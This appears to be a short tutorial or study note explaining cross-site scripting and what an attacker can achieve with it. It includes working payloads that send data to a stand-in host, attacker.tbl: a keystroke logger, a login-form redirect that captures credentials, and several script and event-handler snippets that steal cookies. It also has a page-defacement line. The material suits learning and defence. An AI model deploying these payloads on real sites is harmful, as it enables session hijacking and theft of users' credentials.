# What is Cross-Site Scripting (XSS)?

* `Cross-site scripting (XSS)` is an attack in which its ultimate purpose is to inject HTML (also known as HTML injection) or run code like JavaScript in a user's web browser.
* XSS vulnerabilities happen when a web application uses unfiltered user input to build the output content displayed to its users; this lets an attacker control the output HTML and JavaScript code.

## What could be achieved with XSS

* Inject malicious content.
* Perform virtual defacement of the website:

  ```javascript
  document.body.innerHTML="<h1>Defaced</h1>";
  ```

* Read any data that the user is able to access.
* Perform keylogging:

  ```javascript
  var keys = "";

  document.onkeypress = e => {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
  }

  window.setInterval(() => {
    if (keys !== "") {
      var path = encodeURI("http://attacker.tbl/log.php?k=" + keys);
      new Image().src = path;
      keys = "";
    }
  }, 1000); // Sends the key strokes every second
  ```

* Capture the user's credentials if they are stored in the browser and fields such as `password` and `username` are filled in automatically or through the login form itself:

  ```javascript
  document.forms[0].action="http://attacker.tbl/log.php";
  ```

* Perfom actions on the web application as if it was a legitimate user, like buying a product or changing a password.
* Get complete control over a browser or install malware through the exploitation of web browser vulnerabilities.
* Initiating an exploitation phase against browser plugins first and then the machine.
* Cookie stealing, thus the session of a user:

  ```javascript
  <script>
    var i = new Image();
    i.src="http://attacker.tbl/log.php?q="+escape(document.cookie);
  </script>
  ```

  ```html
  <div id="x" onmouseover="new Image().src='http://attacker.tbl/log.php?q='+escape(document.cookie)"/>
  ```

  ```html
  <a href="victim.tbl/#title" onclick="new Image().src='http://attacker.tbl/log.php?q='+escape(document.cookie)"/>
  ```

* Network reconnaissance of victim's machines networks (e.g. ip detection, network scanning, port scanning) through tools such as [JS-Recon][1] that make use of HTML5 features like Cross-Origin Resource Sharing (CORS) and WebSockets.

[1]: http://web.archive.org/web/20120308180633/http:/www.andlabs.org/tools/jsrecon/jsrecon.html
